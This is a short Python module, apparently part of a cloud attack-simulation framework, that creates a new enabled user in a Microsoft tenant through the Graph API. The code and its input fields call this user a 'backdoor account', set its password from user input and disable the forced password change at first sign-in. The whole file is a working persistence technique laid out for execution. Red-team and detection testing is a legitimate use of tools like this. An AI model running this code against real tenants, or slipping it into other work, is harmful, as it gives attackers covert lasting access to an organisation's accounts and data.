#Create new user in tenant
from core.GraphFunctions import graph_post_request, graph_base_url

def TechniqueMain(display_name, user_principal_name, password):
    endpoint_url = graph_base_url+'users'

    #Generate user details
    mail_nickname = display_name.replace(" ","")

    #Create request payload
    data = {"accountEnabled": 'true',"displayName": display_name,"mailNickname": mail_nickname,"userPrincipalName": user_principal_name,"passwordProfile" : {"forceChangePasswordNextSignIn": 'false',"password": password}}
    try:
        backdoor_account = graph_post_request(url = endpoint_url, data = data)
        return backdoor_account
    except:
        return None


def TechniqueInputSrc() -> list:
    '''Returns the input fields required as parameters for the technique execution'''

    return [
        {"title" : "Backdoor Display Name", "id" : "backdoor-config-display-name-text-input", "type" : "text", "placeholder" : "something strong & long", "element_type" : "dcc.Input"}, 
        {"title" : "Backdoor Username", "id" : "backdoor-config-username-text-input", "type" : "text", "placeholder" : "something strong & long", "element_type" : "dcc.Input"}, 
        {"title" : "Backdoor Password", "id" : "backdoor-config-password-text-input", "type" : "text", "placeholder" : "something strong & long", "element_type" : "dcc.Input"}
        ]